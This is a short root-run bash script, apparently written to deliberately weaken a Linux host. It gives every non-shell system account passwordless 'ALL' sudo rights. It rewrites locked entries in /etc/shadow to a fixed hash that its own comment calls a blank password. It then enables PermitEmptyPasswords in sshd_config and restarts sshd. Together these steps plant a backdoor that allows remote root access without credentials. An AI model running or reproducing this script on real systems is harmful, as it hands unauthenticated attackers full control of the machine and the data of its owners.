#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Script must be run as root"
    exit
fi

DIR="/etc/sudoers.d/sudoers_vww"
rm $DIR > /dev/null
cp sudoers-README $DIR

echo "=== Setting up sudoers ==="

for user in $(getent passwd | grep -v /bin/bash | grep -v /bin/sh | cut -d: -f1); do
    echo -e "$user ALL=(ALL) NOPASSWD: ALL" >> $DIR
    echo "Added $user to sudoers"
done

echo "=== Giving blank passwords to all non-passworded users ==="
sed -i 's/*/U6aMy0wojraho/g' /etc/shadow

echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config
systemctl restart sshd

sudo -k